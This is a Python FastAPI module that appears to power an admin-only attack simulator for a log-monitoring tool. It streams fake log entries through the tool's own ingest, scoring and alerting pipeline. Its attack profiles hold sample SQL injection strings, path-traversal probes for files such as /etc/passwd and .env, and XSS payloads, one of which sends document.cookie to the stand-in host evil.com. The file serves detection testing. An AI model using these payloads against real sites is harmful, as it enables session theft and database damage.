"""Attack simulator — generates realistic fake log entries through the normal ingest pipeline."""
import asyncio
import json
import random
from datetime import datetime, timezone

from fastapi import APIRouter, Depends, Request
from fastapi.responses import StreamingResponse
from pydantic import BaseModel

from app.db.queries import insert_log_entry
from app.db.server_queries import get_server_by_id, touch_server_last_seen
from app.services.alert_engine import process as process_alert
from app.services.ingestion import parse_and_score
from auth.jwt_handler import require_admin
from config import get_config
from ws.stream import broadcast_alert, broadcast_log

router = APIRouter(prefix="/simulate", tags=["simulate"])

# ---------------------------------------------------------------------------
# Attack profiles
# ---------------------------------------------------------------------------

_IPS = {
    "cn": ["61.135.169.{}", "114.80.{}.{}", "183.60.{}.{}"],
    "ru": ["91.108.{}.{}", "5.188.{}.{}", "185.220.{}.{}"],
    "us": ["104.21.{}.{}", "172.67.{}.{}", "198.51.{}.{}"],
    "br": ["177.10.{}.{}", "189.29.{}.{}"],
    "de": ["46.101.{}.{}", "5.9.{}.{}"],
}

_COUNTRIES = {"cn": "CN", "ru": "RU", "us": "US", "br": "BR", "de": "DE"}

_GEO = {
    "CN": (35.0, 105.0), "RU": (61.0, 105.0), "US": (37.0, -95.0),
    "BR": (-14.0, -51.0), "DE": (51.0, 10.0),
}

_PROFILES: dict[str, dict] = {
    "ddos": {
        "label": "DDoS Flood",
        "description": "High-volume GET flood from multiple IPs",
        "paths": ["/", "/index.html", "/api/health", "/static/main.js", "/favicon.ico"],
        "methods": ["GET"],
        "status_codes": [200, 200, 200, 503, 429],
        "response_time_range": (1, 50),
        "origins": ["cn", "ru", "br"],
        "burst": 8,
    },
    "brute_force": {
        "label": "Brute Force",
        "description": "Repeated login attempts from a single IP",
        "paths": ["/admin/login", "/wp-login.php", "/auth/login", "/login", "/admin"],
        "methods": ["POST"],
        "status_codes": [401, 401, 401, 403, 200],
        "response_time_range": (80, 300),
        "origins": ["ru", "cn"],
        "burst": 3,
    },
    "path_scan": {
        "label": "Path Scanner",
        "description": "Scanning for exposed files and admin panels",
        "paths": [
            "/.env", "/.git/config", "/wp-admin", "/phpmyadmin", "/phpinfo.php",
            "/.htaccess", "/config.php", "/../../../etc/passwd", "/backup.zip",
            "/db.sql", "/admin/config", "/.DS_Store", "/server-status",
        ],
        "methods": ["GET"],
        "status_codes": [404, 404, 403, 200, 500],
        "response_time_range": (5, 80),
        "origins": ["cn", "ru", "de"],
        "burst": 5,
    },
    "sql_injection": {
        "label": "SQL Injection",
        "description": "SQL injection probes in query parameters",
        "paths": [
            "/search?q=1' OR '1'='1",
            "/products?id=1 UNION SELECT * FROM users--",
            "/api/user?id=1; DROP TABLE users--",
            "/login?user=admin'--&pass=x",
            "/api/items?filter=1' AND SLEEP(5)--",
        ],
        "methods": ["GET", "POST"],
        "status_codes": [400, 500, 200, 403],
        "response_time_range": (100, 2000),
        "origins": ["ru", "cn", "br"],
        "burst": 2,
    },
    "xss": {
        "label": "XSS Probe",
        "description": "Cross-site scripting injection attempts",
        "paths": [
            "/search?q=<script>alert(1)</script>",
            "/comment?text=<img src=x onerror=alert(document.cookie)>",
            "/api/name?v=javascript:alert(1)",
            "/profile?bio=<svg onload=fetch('https://evil.com?c='+document.cookie)>",
        ],
        "methods": ["GET", "POST"],
        "status_codes": [200, 400, 403],
        "response_time_range": (20, 200),
        "origins": ["us", "br", "ru"],
        "burst": 2,
    },
    "mixed": {
        "label": "Mixed Attack",
        "description": "Combination of all attack types",
        "paths": [
            "/", "/admin", "/.env", "/wp-login.php",
            "/search?q=<script>alert(1)</script>",
            "/api/user?id=1 UNION SELECT--",
            "/phpmyadmin", "/../etc/passwd",
        ],
        "methods": ["GET", "POST"],
        "status_codes": [200, 401, 403, 404, 500],
        "response_time_range": (10, 500),
        "origins": ["cn", "ru", "us", "br", "de"],
        "burst": 4,
    },
}


def _random_ip(profile: dict) -> tuple[str, str, float, float]:
    origin_key = random.choice(profile["origins"])
    tpl = random.choice(_IPS[origin_key])
    ip = tpl.format(*[random.randint(1, 254) for _ in range(tpl.count("{}"))])
    country = _COUNTRIES[origin_key]
    base_lat, base_lon = _GEO[country]
    lat = base_lat + random.uniform(-5, 5)
    lon = base_lon + random.uniform(-10, 10)
    return ip, country, lat, lon


def _make_raw(profile: dict) -> str:
    ip, country, lat, lon = _random_ip(profile)
    path = random.choice(profile["paths"])
    method = random.choice(profile["methods"])
    status = random.choice(profile["status_codes"])
    rt = random.uniform(*profile["response_time_range"])
    ts = datetime.now(timezone.utc).strftime("%Y-%m-%dT%H:%M:%SZ")
    return json.dumps({
        "timestamp": ts,
        "ip": ip,
        "country": country,
        "lat": lat,
        "lon": lon,
        "method": method,
        "path": path,
        "status_code": status,
        "response_time_ms": round(rt, 1),
    })


# ---------------------------------------------------------------------------
# Streaming endpoint
# ---------------------------------------------------------------------------

class SimulateRequest(BaseModel):
    attack_type: str
    count: int = 20        # total entries to send
    interval_ms: int = 500  # delay between entries (ms)
    server_id: int | None = None


@router.post("/run")
async def simulate(body: SimulateRequest, request: Request, _: str = Depends(require_admin)):
    if body.attack_type not in _PROFILES:
        from fastapi import HTTPException
        raise HTTPException(status_code=400, detail=f"Unknown attack type. Valid: {list(_PROFILES)}")

    profile = _PROFILES[body.attack_type]
    cfg = get_config()
    count = min(body.count, 200)
    interval = max(body.interval_ms, 100) / 1000.0

    async def generate():
        for i in range(count):
            raw = _make_raw(profile)
            try:
                entry_insert, threat = parse_and_score(raw, request.app.state.models)
                if body.server_id:
                    entry_insert["server_id"] = body.server_id  # type: ignore[typeddict-unknown-key]
                entry_id = insert_log_entry(entry_insert)

                from app.types.models import LogEntry
                entry = LogEntry(
                    id=entry_id,
                    **{k: v for k, v in entry_insert.items() if k not in ("raw", "server_id")},  # type: ignore[arg-type]
                )

                if body.server_id:
                    touch_server_last_seen(body.server_id)

                alert = process_alert(
                    threat, ip=entry.ip, country=entry.country,
                    path=entry.path, cfg=cfg, server_id=body.server_id,
                )
                await broadcast_log(entry)
                if alert:
                    await broadcast_alert(alert)

                line = json.dumps({
                    "i": i + 1,
                    "total": count,
                    "ip": entry.ip,
                    "path": entry.path,
                    "score": round(entry.threat_score, 1),
                    "level": entry.threat_level,
                    "alerted": alert is not None,
                })
            except Exception as exc:
                line = json.dumps({"i": i + 1, "total": count, "error": str(exc)})

            yield f"data: {line}\n\n"
            await asyncio.sleep(interval)

        yield "data: {\"done\": true}\n\n"

    return StreamingResponse(generate(), media_type="text/event-stream")


@router.get("/profiles")
def get_profiles(_: str = Depends(require_admin)) -> dict:
    return {k: {"label": v["label"], "description": v["description"]} for k, v in _PROFILES.items()}
